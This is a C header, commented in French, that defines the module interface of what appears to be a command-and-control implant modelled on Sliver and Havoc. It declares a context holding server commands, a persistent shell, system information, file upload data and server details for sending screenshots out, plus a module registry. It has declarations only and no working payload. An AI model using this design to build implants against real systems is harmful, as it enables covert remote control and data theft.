/*
 * ============================================================
 *  modules/module.h — Interface commune des modules C2
 *
 *  Rôle : Définit le contrat que chaque module doit respecter.
 *         Permet à core.c de dispatcher dynamiquement les tâches
 *         sans connaître les modules à la compilation.
 *
 *  Pattern : Table de dispatch (registre de modules)
 *            inspiré de la conception Sliver / Havoc.
 *
 *  Pour ajouter un module :
 *    1. Créer modules/mod_<nom>.c
 *    2. Implémenter une fonction int mod_<nom>_exec(ModuleContext *)
 *    3. Appeler register_module("nom", mod_<nom>_exec) dans main.c
 *
 *  Dépend de : ../platform.h, ../utils.h, ../shell.h
 * ============================================================
 */
#ifndef MODULE_H
#define MODULE_H

#include "../platform.h"
#include "../utils.h"
#include "../shell.h"

/* ============================================================
 *  CONTEXTE D'EXÉCUTION D'UN MODULE
 *
 *  Passé par pointeur à chaque module — contient tout ce dont
 *  un module peut avoir besoin. Chaque module n'utilise que
 *  les champs pertinents à sa logique.
 * ============================================================ */
typedef struct {
    /* Commande brute reçue du serveur (ex: "upload C:\dest\file.txt") */
    const char *command;

    /* Données binaires encodées base64 (module upload uniquement) */
    const char *b64_data;

    /* Nom du fichier source original (module upload uniquement)
     * Permet à l'agent d'écrire dans un dossier destination        */
    const char *filename;

    /* Identifiant de la tâche — utilisé pour le sentinel shell */
    const char *task_id;

    /* Shell persistant (module shell uniquement) */
    PersistentShell *shell;

    /* Informations système collectées au démarrage (module sysinfo) */
    const SystemInfo *sysinfo;

    /* Contexte réseau — nécessaire pour les modules qui uploadent directement
     * (ex: screenshot). Pointent sur les champs de AgentContext dans core.c. */
    const char *server_url;
    const char *agent_id;

    /* Buffer de sortie — alloué par l'appelant (MAX_OUTPUT_SIZE) */
    char  *output;
    size_t output_size;
} ModuleContext;

/* Signature commune de toutes les fonctions de module */
typedef int (*ModuleFunc)(ModuleContext *ctx);

/* ============================================================
 *  STRUCTURE D'UN MODULE
 * ============================================================ */
typedef struct {
    char       name[32];   /* Nom du module — correspond au champ "module" du JSON */
    ModuleFunc exec;       /* Fonction d'exécution                                 */
} Module;

/* ============================================================
 *  REGISTRE GLOBAL DES MODULES
 * ============================================================ */

/**
 * Enregistre un module dans le registre global.
 * Appelé une fois par module dans main().
 */
void register_module(const char *name, ModuleFunc func);

/**
 * Recherche un module par nom dans le registre.
 * Retourne un pointeur sur le Module, ou NULL si non trouvé.
 */
Module *find_module(const char *name);

#endif /* MODULE_H */
